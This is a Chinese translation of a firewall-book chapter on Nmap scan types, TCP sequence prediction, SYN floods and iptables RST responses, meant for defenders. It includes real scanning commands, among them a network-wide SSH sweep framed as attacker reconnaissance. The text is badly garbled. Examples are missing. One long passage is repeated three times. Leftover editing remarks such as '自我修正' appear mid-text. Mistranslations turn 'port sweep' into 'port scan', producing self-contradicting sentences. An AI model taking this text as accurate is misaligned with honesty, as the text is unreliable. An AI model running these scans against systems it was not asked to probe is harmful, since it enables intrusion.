*   TCP SYN 或半开扫描——(Nmap `-sS`)
*   TCP FIN、XMAS 和 NULL 扫描——(Nmap `-sF`, `-sX`, `-sN`)
*   TCP ACK 扫描——(Nmap `-sA`)
*   TCP 空扫描——(Nmap `-sI`)
*   UDP 扫描——(Nmap `-sU`)

在下面的每次扫描中都使用了 `Nmap -P0` 命令行选项，强制 `Nmap` 在扫描之前跳过判断 `iptablesfw` 系统是否在线（即省略主机发现）。从 `Nmap` 的角度来看，每个扫描的端口可能处于三种状态之一：

| open | 端口上绑定了服务器，且是可以访问的。 |
| :--- | :--- |
| closed | 端口上没有绑定服务器。 |
| filtered | 端口上可能绑定了服务器，但与其通信的尝试被拦截，Nmap 无法确定端口是开启还是关闭的。 |

## TCP connect() 扫描

当普通客户端尝试通过网络与绑定到 TCP 端口的服务器通信时，本地 TCP 栈会代表客户端与远程堆栈进行交互。在传输任何应用层数据之前，两个堆栈必须协商控制客户端和服务器之间即将发生的对话的参数。这种协商是标准的 TCP 三次握手，需要三个数据包，如图 3-4 所示。

![TCP 三次握手](img/httpatomoreillycomsourcenostarchimages207447.png)

图 3-4. TCP 三次握手

第一个数据包 `SYN`（同步 ize）由客户端发送到服务器。该数据包宣告了所需的初始序列号（此外还有 TCP 窗口大小以及允许选择性确认等选项），用于跨 TCP 会话跟踪服务器跟踪传输。如果 `SYN` 数据包到达开放端口，服务器 TCP 栈将响应 `SYN/ACK`，以确认收到客户端的初始序列值，并向客户端宣告自己的序列号。客户端接收 `SYN/ACK` 并向服务器响应确认。此时，双方都已同意连接参数（包括初始序列号），且连接状态被定义为已建立并准备传输数据。

在 TCP `connect()` 扫描的语境下，扫描器为每个扫描的端口同时发送 `SYN` 和结束的 `ACK` 数据包。任何普通用户都可以以此模式使用 `Nmap` 扫描远程系统；不需要特殊权限。

是从 `SYN` 扫描显示的某些 `iptables` 日志消息以及相应的 `Nmap` 输出。你可以看到 `http` 和 `https` 端口是开启的，且 `SYN` 数据包的选项部分包含了大量的选项：





```
 [ext_scanner]$ nmap -P0 -sT 71.157.X.X
Starting Nmap 4.01 ( http://www.insecure.org/nmap/ ) at 2007-07-03 00:32 EDT
Interesting ports on 71.157.X.X:
(The 1670 ports scanned but not shown below are in state: filtered)
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https
Nmap finished: 1 IP address (1 host up) scanned in 30.835 seconds

[iptablesfw]# grep SYN /var/log/messages | tail -n 1
Jul  3 00:32:32 iptablesfw kernel: DROP IN=eth0 OUT=
MAC=00:13:d3:38:b6:e4:00:30:48:80:4e:37:08:00 SRC=144.202.X.X DST=71.157.X.X
LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=65148 DF PROTO=TCP SPT=43237 DPT=653
WINDOW=5840 RES=0x00 SYN URGP=0 OPT (020405B40402080A362957720000000001030306)
```

### TCP SYN 扫描或半开放扫描

SYN 扫描或半开放扫描与 `connect()`扫描类似，因为扫描器向每个 TCP 端口发送一个 `SYN` 数据包，试图诱导 `SYN/ACK` 或 `RST/ACK` 响应，以显示目标端口是开放还是关闭的。然而，扫描系统永远不会完成三次握手，因为它故意不向任何带有 `SYN/ACK` 响应的开放端口返回 `ACK` 数据包。因此，SYN 扫描也称为半开放扫描，因为三次握手从未获得过优雅地完成的机会，正如图 3-5 所示。

![TCP half-open scan](img/httpatomoreillycomsourcenostarchimages207386.png)

图 3-5. TCP 半开放扫描

SYN 扫描无法通过 `connect()` 系统调用完成，因为该调用会触发原生的 TCP 栈代码，该代码会对从目标接收到的每个 `SYN/ACK`  `ACK`。因此，在 SYN 扫描中发送的每个 `SYN` 数据包必须由完全绕过 TCP 栈的机制构造。这通常通过使用原始套字（raw socket）构建一个数据结构来实现，当该结构被操作系统内核放置在链路上时模拟 `SYN` 数据包。

#### 原始套字与未请求的 SYN/ACK

使用原始套字向远程系统构造 TCP `SYN` 数据包而不是使用 `connect()` 系统调用会带来一个有趣的问题。如果远程主机响应 `SYN/ACK`，那么扫描系统的本地 TCP 栈会收到 `SYN/ACK`，但发出的 `SYN` 数据包并非来自本地栈（因为我们通过原始套字手动构造的），所以对于栈来说，`SYN/ACK` 并不是合法的 TCP 握手的一部分。因此，扫描器的本地栈会向目标系统发送 `RST`，因为 `SYN/ACK` 看起来是未请求的。你可以在开始扫描之前，通过命令向 `OUTPUT` 链中添加以下 `iptables` 规则来停止这种行为：

```
 [ext_scanner]# iptables -I OUTPUT 1 -d target -p tcp --tcp-flags RST RST -j
DROP
```

Nmap 使用原始套字手动构建 SYN 扫描模式（`-sS`）中使用的 TCP `SYN` 数据包，这是特权用户的默认扫描模式。由于这些数据包的特征是由 Nmap 直接决定的（不使用本地 TCP 栈），它们与栈通常生成的 TCP `SYN` 数据包有显著差异。例如，如果我们用浏览器启动到 `http://www.google.com` 的网络会话并使用 `tcpdump` 显示本地 Linux TCP 栈的 `SYN` 数据包，我们将看到如下：

```
 [iptablesfw]# tcpdump -i eth0 -l -nn port 80
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening
on eth0,
link-type EN10MB (Ethernet), capture size 96 bytes
11:13:40.255182 IP 71.157.X.X.59603 > 72.14.203.99.80: S 2446075733:2446075733(0)
win 5840
<mss 1460,sackOK,timestamp 277196169 0,nop,wscale 2>
```

上面**加粗**显示的是 TCP 头部中的窗口大小和选项部分。每个值的具体数值由本地 TCP 栈定义，并用于与远程主机协商建立有效的 TCP 会话。

与真实 TCP 栈生成的 `SYN` 数据包不同，Nmap 并不关心建立真实的 TCP 会话。Nmap 感兴趣的是远程端口是开放（Nmap 接收 `SYN/ACK`）、关闭（Nmap 接收 `RST/ACK`）还是被过滤（Nmap 接收不到）。因此，Nmap 放在链上的 TCP `SYN` 数据包只需要满足远程主机带有 `SYN` 标志，以便远程 TCP 栈响应 `SYN/ACK`、`RST/ACK` 或无（如果端口被过滤）。

对于 `3.*` 系列的 Nmap，用于扫描远程系统的 `SYN` 数据包不包含 TCP 选项（如果包含选项，它们将出现在 TCP 窗口之后，如此处**加粗**所示）。

对于最新版本的 Nmap，最大段大小（MSS）包含在其发送的 `SYN` 数据包中，如下：

## TCP FIN、XMAS 和 NULL 扫描

FIN、XMAS 和 NULL 扫描遵循这样一个原理：如果符合 RFC 的任何 TCP 栈在端口接收到未设置 `SYN`、`ACK` 或 `RST` 位的意外 TCP 数据包，它应该以特定方式响应。如果端口是关闭的，TCP 响应 `RST/ACK`；但如果是是开放，TCP 不响应任何数据包。

下面的示例显示了 `iptablesfw` 系统的 FIN 扫描，注意 ❶ 所有端口都被 Nmap 报告为 `open|filtered`。因为意外的 FIN 数据包不属于任何 TCP 连接，所有 FIN 数据包（即使是开放端口）都会匹配 iptables 策略中的 `INVALID` 状态并随后被记录。（参见 ❷ 处的 `DROP INVALID` 日志前缀和 ❸ 处的 FIN 标志）。




`ACK` 扫描的目标不是确定端口是开放还是关闭，而是确定端口是否被状态检测防火墙过滤。因为当使用 `Netfilter` 连接跟踪子系统时（通过 `state match`），`iptables` 防火墙始终是状态检测的，因此不会有意外的 `ACK` 数据包进入 `iptablesfw` 系统的 TCP 协议栈。因此，如此所示，系统不会向扫描器返回任何 `RST` 数据包（注意在 ❷ 处设置的 `ACK` 标记）：

```
 [ext_scanner]# nmap -P0 -sA 71.157.X.X
Starting Nmap 4.01 ( http://www.insecure.org/nmap/ ) at 2007-07-03 00:36 EDT
All 1672 scanned ports on 71.157.X.X are: ❶filtered
Nmap finished: 1 IP address (1 host up) scanned in 36.191 seconds
[iptablesfw]# grep ACK /var/log/messages | tail -n 1
Jul  3 00:37:18 iptablesfw kernel: DROP IN=eth0 OUT=
MAC=00:13:d3:38:b6:e4:00:30:48:80:4e:37:08:00 SRC=144.202.X.X DST=71.157.X.X
LEN=40 TOS=0x00 PREC=0x00 TTL=43 ID=51322 PROTO=TCP SPT=62068 DPT=6006
WINDOW=4096 RES=0x00 ❷ACK URGP=0
```

### TCP 空闲扫描

`TCP idle scan` 是一种高级扫描模式，需要三个系统：一个启动扫描的系统、扫描目标以及一个运行未被频繁使用的 TCP 服务器的僵尸主机（这就是扫描名称中“空闲”部分的来源）。空闲扫描在图 3-6 中进行了说明。

![TCP idle scan](img/tcpatomoreillycomsourcenostarchimages207428.png)

图 3-6. TCP 空闲扫描

空闲扫描利用了这样一个事实：每通过 IP 协议栈发送一个包，IP ID 值就会加 1。扫描将此事实与以下要求结合：TCP 协议栈需要对开放端口的 `SYN` 包返回 `SYN/ACK` 包，或对关闭端口的 `SYN` 包返回 `RST/ACK` 包。此外，所有 TCP 协议栈都要求忽略未请求的 `RST/ACK` 包。综合来看，这些事实允许扫描器在扫描器到僵尸主机维持的 TCP 会话期间，观察僵尸主机如何增加 IP ID 值，同时扫描器在目标系统使用僵尸主机的 IP 地址伪造 `SYN` 包。结果，扫描器能够监控来自僵尸系统的数据包 IP 头部中的 IP ID 值，并根据这些信息推断出目标上的端口是开放还是关闭的。

当扫描器向目标上的`开放端口`发送 `SYN` 包时（参见图 3-6），且源 IP 地址伪造为僵尸机的地址，目标会响应 `SYN/ACK`（给僵尸系统）。由于僵尸收到的 `SYN` 包实际上是未请求的（由扫描器伪造的），它会向目标系统响应 `RST`，从而使 IP ID 计数器加 1。如果扫描器向目标上的`关闭端口`发送 `SYN` 包（同样伪造了源 IP 地址），目标将向僵尸响应 `RST/ACK`，而僵尸会忽略这个未请求的包。由于在这种情况下僵尸主机没有发送任何包，因此 IP ID 值不会增加。

通过监控 IP ID 值的增加情况（目标上的开放端口加 1，关闭端口则不增加），扫描器可以推断出目标系统上哪些端口是开放的。然而，决定空闲扫描成功的最重要因素是僵尸主机上可用服务的利用率。流行的 Web 服务器不适合作为僵尸主机。在这种情况下，由于*每一个* TCP 连接都会增加 IP ID 值，该值在大部分情况下会超出扫描器的控制范围。这使得将 IP ID 值的变化映射到被扫描端口变得不实际。

作为空闲扫描目标的系统无法知道扫描的真实来源，因为它们看到的只是来自僵尸主机的伪造 `SYN` 包。目标上的 `iptables` 日志看起来就像普通的 `SYN` 扫描（参见第 56 页的“ [TCP SYN 或半开放扫描”）。

### 注意事项

如果僵尸主机上运行着默认丢弃（default-drop）防火墙，空闲扫描唯一可行的方法是扫描器将源端口硬编码为僵尸主机上的一个开放 TCP 端口。原因是被过滤的 `SYN/ACK` 不会被僵尸 TCP 协议栈看到，因此它永远不会发送 `RST`，从而 IP ID 不会增加。在某些情况下，如果部署了防火墙，僵尸主机可能没有任何响应。

### UDP 扫描

由于 UDP 不实现连接，UDP 扫描是通过向特定端口发送数据并查看在合理时间内是否有返回来完成的，简单的。如果防火墙阻止了 UDP 包，会触发 `ICMP 端口不可达` 消息，这使得扫描器很容易判断 UDP 端口是否关闭。相反，针对开放端口的 UDP 包可能会完全沉默。这是因为 UDP 服务器并不*义务*响应；是否响应完全取决于特定端口。

如果防火墙拦截了扫描器发往特定端口的 UDP 包，扫描器看起来什么都没有。这就是为什么 `nmap` 报告过滤的端口为 `open|filtered`。例如，是 `nmap` 扫描的几行 `iptables` 日志，你可以看到被扫描的 UDP 端口都是 `open|filtered`（加粗所示）：

```
 [ext_scanner]# nmap -P0 -sU 71.157.X.X
Starting Nmap 4.01 ( http://www.insecure.org/nmap/ ) at 2007-07-03 00:44 EDT
All 1482 scanned ports on 71.157.X.X are: open|filtered
Nmap finished: 1 IP address (1 host up) scanned in 32.260 seconds

[iptablesfw]# tail /var/log/messages | grep UDP | tail -n 1
Jul  3 00:45:01 iptablesfw kernel: DROP IN=eth0 OUT=
MAC=00:13:d3:38:b6:e4:00:30:48:80:4e:37:08:00 SRC=144.202.X.X DST=71.157.X.X
LEN=28 TOS=0x00 PREC=0x00 TTL=42 ID=48755 PROTO=UDP SPT=60906 DPT=381 LEN=8
```

### 端口扫描

端口扫描是一种与端口扫描相似的侦察方法。然而，端口扫描不是为了列出单个主机上的可访问服务，而是检查多个主机上同一个服务的可用性。从安全角度来看，端口扫描引起的关注通常比端口扫描更大，因为它们通常意味着系统已被蠕病毒感染并正在寻找其他感染目标。如果网络运行着大量的 Windows 系统（这些通常是蠕病毒活动的主要目标），那么检测端口扫描比检测端口扫描更重要。然而，面对像 SQL Slammer 蠕病毒这样的蠕病毒，即使是早期检测可能也意义不大，这种病毒在几分钟内在全球范围内感染了数万台系统；当检测到蠕病毒时，可能已经无能为力了。当像 Slammer 这样快速传播的蠕病毒最初释放时，编写并分发新的 Snort 特征码的时间远于蠕病毒感染几乎所有漏洞系统的时间。一旦有了可靠的特征码，入侵防御系统可能阻止该蠕病毒，但限制蠕病毒的最佳方法是修复它所利用的漏洞。尽管如此，检测来自内部网络的端口扫描仍然是识别受感染系统的好方法（幸运的是，并不是所有的蠕病毒都像 Slammer 蠕病毒那样快速传播）。





Nmap 可以轻松地利用其所有的扫描能力来扫描整个网络以寻找特定的服务。例如，如果攻击者拥有针对 `SSH` 守护进程的漏洞，Nmap 可以如下所示找到整个 `10.0.0.0/8` 子网中所有可访问的此类实例：

```
 [ext_scanner]# nmap -P0 -p 22 -sS 10.0.0.0/8
```

## TCP 序列号预测攻击

TCP 并没有内置强身份验证或加密层；这项被留给了应用层处理。因此，`TCP` 会话容易受到各种攻击的威胁，这些攻击旨在向 `TCP` 流中注入数据、劫持会话或强制关闭会话。

为了向已建立的 `TCP` 连接中注入数据，攻击者必须知道（或猜测）用于跟踪数据传输的当前序列号，这取决于连接的双方在任何数据传输之前所选择的初始序列号。某些 `TCP` 协议栈已经做了大量工作来确保初始序列号是随机选择的（`OpenBSD` 栈就是一个很好的例子），而且 `TCP` 头部中序列号字段的大小（32 位）在 `TCP` 连接无法被攻击者嗅探时也提供了一定的猜测抗性。然而，Paul A. Watson 在《窗口中的滑行：TCP 重置攻击》中报告了一个在 Cisco 路由器中使用 `RST` 包拆断 `BGP` 对等会话时，猜测 `TCP` 序列号的著名案例（更多信息请参阅 [`osvdb.org/reference/slippinginthewindow_v1.0.doc`](http://osvdb.org/reference/slippinginthewindow_v1.0.doc)）。

当网络网关运行 `iptables` 时，阻碍内部网络人员使用序列号猜测攻击针对外部 `TCP` 会话的最佳方法之一是建立规则，丢弃源自内部网络的伪造数据包。也就是说，为了使此类攻击成功，攻击者必须伪造数据包绕过 `iptables` 并从外部 `TCP` 客户端或服务器 IP 地址进入连接。使用 `iptables`，通过丢弃任何源地址位于内部网络之外的内部接口数据包，可以很容易阻止伪造包被转发。（这是通过 第 1 章 中讨论的默认 `iptables` 策略实现的。）

## SYN 洪水

`SYN` 洪水会从伪造的源地址产生大量的 `TCP SYN` 包，并指向特定的 `TCP` 服务器。其目标是通过强制使目标 `TCP` 协议栈投入所有资源发送 `SYN/ACK` 包，并等待永远不会来的 `ACK` 包，从而使服务器崩溃。`SYN` 洪水是纯粹的拒绝服务攻击。`iptables` 通过 limit 匹配为 `SYN` 洪水提供了一些保护：

```
 [iptablesfw]# iptables -I FORWARD 1 -p tcp --syn -m limit --limit 1/s -j ACCEPT
```

***

^([23]) ³ `TCP` 和 `UDP` 头部中的源目的端口字段宽度为 16 位，因此总共有 65,536 (2¹⁶) 个端口（包括可以通过 Nmap 扫描的 0 端口）。

^([24]) ⁴ 尽管 Nmap 可以扫描端口 0，但操作系统不允许服务器 `bind()` 到端口 0 。

^([25]) ⁵ 在这种情况下，来自僵尸的 `RST` 包不包含 `ACK` 位，因为来自目标的 `SYN/ACK` 确实设置了 `ACK` 位。关于在 `RST` 包上设置 `ACK` 位的情况的更多材料包含在第 63 页的“RST vs. RST/ACK”。

## 传输层响应

在某些条件下，传输层会对流量做出响应。防火墙或其他过滤设备可以根据传输层头部实施过滤操作（参见 第 1 章 中提供的 `iptables.sh` 脚本）、制造 `TCP RST` 或 `RST/ACK` 包来拆断 `TCP` 连接，或者限制入站包的速率（例如在给定时间内 `TCP SYN` 包的数量）。

### 备注

我们将在 第 10 章 和 第 11 章 中看到更多主动响应措施，在那里我们将展示如何在检测到应用层攻击时使用 `iptables` 在网络层和传输层做出响应。

然而，在如今的系统入侵方面，应用层是大多数有趣活动的地方。将应用层漏洞交付到目标系统涉及的传输层通信本身是无害的（毕竟攻击者希望传输层能够*正常工作*）。由于端口扫描和端口遍历很容易从伪造的源 IP 地址发送，因此对端口扫描和端口遍历等传输层活动做出响应是有风险的。

### TCP 响应

在 `TCP` 中，传输层有一个内置的响应响应机制。这种能力以 `TCP RST`重置）或 `RST/ACK`重置/确认）包的形式实现。该包通知接收端 `TCP` 协议栈无法再发送数据，且连接将被终止，无论其当前状态如何。`RST` 标志是 `TCP` 头部 6 位控制位字段中的元素之一。每当 `TCP` 客户端或服务器遇到无法维持的条件时就会使用它，连接的任何都可以发出 `RST`。

### RST vs. RST/ACK

许多防火墙和入侵检测系统可以发送 `TCP RST` 包来关闭恶意连接，但发送此类包的实现细节差异很大。一个经常被忽略的细节是防火墙或 IDS 发送的是纯 `RST` 包还是 `RST/ACK` 包。

根据 `RFC 793`，`TCP` 协议栈生成 `RST/ACK` 的情况只有三种；其余时间，发送的是不带 `ACK` 位的 `RST` 包。此外，`TCP` 会话中最后一个包的 `ACK` 位与用于拆断连接的 `RST` 包之间存在反比关系。也就是说，如果最后一个包包含了 `ACK` 位，则 `RST` 包不应包含；如果最后一个包不包含 `ACK` 位，则应该发送 `RST`。

例如，如果 `TCP SYN` 包发送到一个没有服务器监听的端口（即端口处于 `CLOSED` 状态），则会返回 `RST/ACK`。但如果 `SYN/ACK` 包发送到一个 `CLOSED` 端口，则会返回不带 `ACK` 位的 `RST` 包。这两个场景由以下示例所示：

```
❶ [iptablesfw]# iptables -I INPUT 1 -p tcp --dport 5001 -j ACCEPT
❷ [ext_scanner]# nmap -P0 -sS -p 5001 71.157.X.X
[iptablesfw]# tcpdump -i eth0 -l -nn port 5001
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes
17:10:24.693292 IP 144.202.X.X.33736 > 71.157.X.X.5001: S
522224616:522224616(0) win 2048 <mss 1460>
17:10:24.693413 IP 71.157.X.X.5001 > 144.202.X.X.33736: ❸R 0:0(0) ack
522224617 win 0
❹ [ext_scanner]# nmap -P0 -sA -p 5001 71.157.X.X
[iptablesfw]# tcpdump -i eth0 -l -nn port 5001
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
17:11:03.985446 IP 144.202.X.X.62669 > 71.157.X.X.5001: . ack 1406759780 win
1024
17:11:03.985477 IP 71.157.X.X.5001 > 144.202.X.X.62669: ❺R
1406759780:1406759780(0) win 0
```




在上述 ❶ 处，`iptables` 对于 TCP 端口 5001 被排除在外，允许任何客户端直接与 `iptablesfw` 系统上的 Linux TCP 栈通信。这消除了 `iptables` 这一可能导致结果偏差的潜在因素。在 ❷ 处，针对 `iptablesfw` 系统的端口 5001 发送了一个标准的 `Nmap` SYN 扫描，下一行显示了用于观察的 `tcpdump` 命令。在 ❸ 处，本地 TCP 栈向客户端发送了 RST，该 RST 具有一个非零的确认值；设置了 ACK 位是因为来自 `Nmap` 的 SYN 数据包（显示在 `tcpdump` 输出的上一行）不包含 ACK 位。

在 ❹ 处，针对端口 5001 发送了另一个 `Nmap` 扫描：ACK 扫描。在 ❺ 处看到了来自本地 TCP 栈的 RST，其没有确认号且 ACK 位未被设置。这是因为来自 `Nmap` 的数据包包含一个确认号并设置了 ACK 位。

`iptables` 的 `REJECT` 目标实现了匹配到的 TCP 数据包上的 ACK 标志与其生成的 RST 之间的反向关系。这种关系通过内核源码中 `linux/net/ipv4/netfilter/ipt_REJECT.c` 文件中的以下代码段强制（参见 `send_reset()` 函数——为了可读性已省略了部分代码）：

```c
 static void send_reset(struct sk_buff *oldskb, int hook)
{
    struct tcphdr *tcph; ❶  int needs_ack;
❷  if (tcph->ack) {
❸       needs_ack = 0;
        tcph->seq = oth->ack_seq;
        tcph->ack_seq = 0;
    } else {
❹       needs_ack = 1;
        tcph->ack_seq = htonl(ntohl(oth->seq) + oth->syn + oth->fin
                      + oldskb->len - oldskb->nh.iph->ihl*4
                      - (oth->doff<<2));
        tcph->seq = 0;
    }
❺   tcph->ack = needs_ack;
}
```

在 ❶ 处，声明了一个标志 `needs_ack`，用于判断生成的 TCP RST 数据包是否包含 ACK 控制位（以及相应的非零确认值）。如果原始 TCP 数据包包含 ACK 位（参见 ❷——在此阶段 `tcph` 指针指向原始数据包的可写副本），则 `needs_ack` 标志和确认值都将被设置为 0（❸）。如果原始 TCP 数据包不包含 ACK 位，则在 ❹ 处将 `needs_ack` 标志设置为 1，且确认值从原始数据包中得出。最后，在 ❺ 处，根据 `needs_ack` 标志的值将 ACK 位设置为 0 或 1。`REJECT` 目标中的此逻辑复制自实现 TCP 栈的代码；你可以在 Linux 内核源码中 `net/ipv4/tcp_ipv4.c` 文件的 `tcp_v4_send_reset()` 函数第 569 行左右看到它。为了看到这一效果，我们现在将观察 iptables 如何在 TCP 连接进入建立状态且从客户端向服务器发送字符串 `tester` 后断开该已建立的 TCP 连接。（我们将在第 10 章和第 11 章中看到更多此类传输层对应用层数据的响应示例。）

```bash
 ❶ [iptablesfw]# iptables -I INPUT 1 -p tcp --dport 5001 -j ACCEPT❼
[iptablesfw]# iptables -I INPUT 1 -p tcp --dport 5001 -m string --string
"tester" --algo bm -j REJECT --reject-with tcp-reset
❷ [iptablesfw]# nc -l -p 5001 &
[1] 8135
[ext_scanner]$ echo "tester" | nc 71.157.X.X 5001
❸ [iptablesfw]# tcpdump -i eth0 -l -nn -s 0 -X port 5001
❹ 22:33:25.826122 IP 144.202.X.X.54922 > 71.157.X.X.5001: S 741951920:
741951920(0) win 5840 <mss 1460,sackOK,timestamp 842078832 0,nop,wscale 6>
22:33:25.826161 IP 71.157.X.X.5001 > 144.202.X.X.54922: S 264203278:
264203278(0) ack 741951921 win 5792 <mss 1460,sackOK,timestamp 647974503
842078832,nop,wscale 5>
22:33:25.826263 IP 144.202.X.X.54922 > 71.157.X.X.5001: . ack 1 win 92
<nop,nop,timestamp 842078832 64797403>
22:33:25.826612 IP 144.202.X.X.54922 > 71.157.X.X.5001: P 1:8(7) ❺ack 1 win
92 <nop,nop,timestamp 842078832 64797403>
      0x0000:  4500 003b 53c2 4000 4006 1d94 0000 0000  E..;S.@.@...G..
      0x0010:  0000 0000 d68a 1389 2c39 49b1 0fbf 6c0f  G..3....,9I...l.
      0x0020:  8018 005c b82a 0000 0101 080a 3231 1a70  ...\.*......21.p
      0x0030:  269f 4e67 7465 7374 6572 0a              &.Ng❻tester.
22:33:25.826665 IP 71.157.X.X.5001 > 144.202.X.X.54922: ❼R
264203279:264203279(0) win 0```

在 ❶ 处，我们首先包含一条 `ACCEPT` 到 TCP 端口 5001 的规则，接着是 ❷ 规则：`iptables -I INPUT 1 -p tcp --dport 5001 -m string --string "tester" --algo bm -j REJECT`...等等，重新阅读文本流：

在 ❶ 处，声明了一个 `needs_ack` 标志，用于判断生成的 TCP RST 数据包是否包含 ACK 位（以及相应的非零确认值）。如果原始 TCP 数据包包含 ACK 位（参见 ❷——在此阶段 `tcph` 指针指向原始数据包的可写副本），则 `needs_ack` 标志和确认值都将被设置为 0（❸）。如果原始 TCP 数据包不包含 ACK 位，则在 ❹ 处将 `needs_ack` 标志设置为 1，且确认值从原始数据包中得出。最后，在 ❺ 处，根据 `needs_ack` 标志的值将 ACK 位设置为 0 或 1。`REJECT` 目标中的此逻辑复制自实现 TCP 栈的代码；你可以在 Linux 内核源码中 `net/ipv4/tcp_ipv4.c` 文件的 `tcp_v4_send_reset()` 函数第 569 行看到它。为了看到这一效果，我们现在将观察 iptables 如何在 TCP 连接进入建立状态且从客户端向服务器发送字符串 `tester` 后断开该已建立的 TCP 连接。（我们将在第 10 章和第 11 章中看到更多此类传输层对应用层数据的响应示例。）

```bash
 ❶ [iptablesfw]# iptables -I INPUT 1 -p tcp --dport 5001 -j ACCEPT❼
[iptablesfw]# iptables -I INPUT 1 -p tcp --dport 5001 -m string --string
"tester" --algo bm -j REJECT --reject-with tcp-reset
❷ [iptablesfw]# nc -l -p 5001 &
[1] 8135
[ext_scanner]$ echo "tester" | nc 71.157.X.X 5001
❸ [iptablesfw]# tcpdump -i eth0 -l -nn -s 0 -X port 5001
❹ 22:33:25.826122 IP 144.202.X.X.54922 > 71.157.X.X.5001: S 741951920:
741951920(0) win 5840 <mss 1460,sackOK,timestamp 842078832 0,nop,wscale 6>
22:33:25.826161 IP 71.157.X.X.5001 > 144.202.X.X.54922: S 264203278:
264203278(0) ack 741951921 win 5792 <mss 1460,sackOK,timestamp 647974503
842078832,nop,wscale 5>
22:33:25.826263 IP 144.202.X.X.54922 > 71.157.X.X.5001: . ack 1 win 92
<nop,nop,timestamp 842078832 64797403>
22:33:25.826612 IP 144.202.X.X.54922 > 71.157.X.X.5001: P 1:8(7) ❺ack 1 win
92 <nop,nop,timestamp 842078832 64797403>
      0x0000:  4500 003b 53c2 4000 4006 1d94 0000 0000  E..;S.@.@...G..5
      0x0010:  0000 0000 d68a 1389 2c39 49b1 0fbf 6c0f  G..3....,9I...l.
      0x0020:  8018 005c b82a 0000 0101 080a 3231 1a70  ...\.*......21.p
      0x0030:  269f 4e67 7465 7374 6572 0a              &.Ng❻tester.
22:33:25.826665 IP 71.157.X.X.5001 > 144.202.X.X.54922: ❼R
264203279:264203279(0) win 0```

（自我修正：待排版的文本包含一些重复/断的部分。我将严格遵循“以下是需要排版的文本”部分的原文。）

在上述 ❶ 处，`iptables` 对于 TCP 端口 5001 被排除在外，允许任何客户端直接与 `iptablesfw` 系统上的 Linux TCP 栈通信。这消除了 `iptables` 这一可能导致结果偏差的潜在因素。在 ❷ 处，针对 `iptablesfw` 系统的端口 5001 发送了一个标准的 `Nmap` SYN 扫描，下一行显示了用于观察的 `tcpdump` 命令。在 ❸ 处，本地 TCP 栈向客户端发送了 RST，该 RST 具有一个非零的确认值；设置了 ACK 位是因为来自 `Nmap` 的 SYN 数据包（显示在 `tcpdump` 输出的上一行）不包含 ACK 位。

在 ❹ 处，针对端口 5001 发送了另一个 `Nmap` 扫描：ACK 扫描。在 ❺ 处看到了来自本地 TCP 栈的 RST，其没有确认号且 ACK 位未被设置。这是因为来自 `Nmap` 的数据包包含一个确认号并设置了 ACK 位。

`iptables` 的 `REJECT` 目标实现了匹配到的 TCP 数据包上的 ACK 标志与其生成的 RST 之间的反向关系。这种关系通过内核源码中 `linux/net/ipv4/netfilter/ipt_REJECT.c` 文件中的以下代码段强制（参见 `send_reset()` 函数——为了可读性已省略了部分代码）：

```c
 static void send_reset(struct sk_buff *oldskb, int hook)
{
    struct tcphdr *tcph; ❶  int needs_ack;
❷  if (tcph->ack) {
❸       needs_ack = 0;
        tcph->seq = oth->ack_seq;
        tcph->ack_seq = 0;
    } else {
❹       needs_ack = 1;
        tcph->ack_seq = htonl(ntohl(oth->seq) + oth->syn + oth->fin
                      + oldskb->len - oldskb->nh.iph->ihl*4
                      - (oth->doff<<2));
        tcph->seq = 0;
    }
❺   tcph->ack = needs_ack;
}
```

在 ❶ 处，声明了一个标志 `needs_ack`，用于判断生成的 TCP RST 数据包是否包含 ACK 控制位（以及相应的非零确认值）。如果原始 TCP 数据包包含 ACK 位（参见 ❷——在此阶段 `tcph` 指针指向原始数据包的可写副本），则 `needs_ack` 标志和确认值都将被设置为 0（❸）。如果原始 TCP 数据包不包含 ACK 位，则在 ❹ 处将 `needs_ack` 标志设置为 1，且确认值从原始数据包中得出。最后，在 ❺ 处，根据 `needs_ack` 标志的值将 ACK 位设置为 0 或 1。`REJECT` 目标中的此逻辑复制自实现 TCP 栈的代码；你可以在 Linux 内核源码中 `net/ipv4/tcp_ipv4.c` 文件的 `tcp_v4_send_reset()` 函数第 569 行看到它。为了看到这一效果，我们现在将观察 iptables 如何在 TCP 连接进入建立状态且从客户端向服务器发送字符串 `tester` 后断开该已建立的 TCP 连接。（我们将在第 10 章和第 11 章中看到更多此类传输层对应用层数据的响应示例。）

```bash
 ❶ [iptablesfw]# iptables -I INPUT 1 -p tcp --dport 5001 -j ACCEPT❼
[iptablesfw]# iptables -I INPUT 1 -p tcp --dport 5001 -m string --string
"tester" --algo bm -j REJECT --reject-with tcp-reset
❷ [iptablesfw]# nc -l -p 5001 &
[1] 8135
[ext_scanner]$ echo "tester" | nc 71.157.X.X 5001
❸ [iptablesfw]# tcpdump -i eth0 -l -nn -s 0 -X port 5001
❹ 22:33:25.826122 IP 144.202.X.X.54922 > 71.157.X.X.5001: S 741951920:
741951920(0) win 5840 <mss 1460,sackOK,timestamp 842078832 0,nop,wscale 6>
22:33:25.826161 IP 71.157.X.X.5001 > 144.202.X.X.54922: S 264203278:
264203278(0) ack 741951921 win 5792 <mss 1460,sackOK,timestamp 647974503
842078832,nop,wscale 5>
22:33:25.826263 IP 144.202.X.X.54922 > 71.157.X.X.5001: . ack 1 win 92
<nop,nop,timestamp 842078832 64797403>
22:33:25.826612 IP 144.202.X.X.54922 > 71.157.X.X.5001: P 1:8(7) ❺ack 1 win
92 <nop,nop,timestamp 842078832 64797403>
      0x0000:  4500 003b 53c2 4000 4006 1d94 0000 0000  E..;S.@.@...G..5
      0x0010:  0000 0000 d68a 1389 2c39 49b1 0fbf 6c0f  G..3....,9I...l.
      0x0020:  8018 005c b82a 0000 0101 080a 3231 1a70  ...\.*......21.p
      0x0030:  269f 4e67 7465 7374 6572 0a              &.Ng❻tester.
22:33:25.826665 IP 71.157.X.X.5001 > 144.202.X.X.54922: ❼R
264203279:264203279(0) win 0```




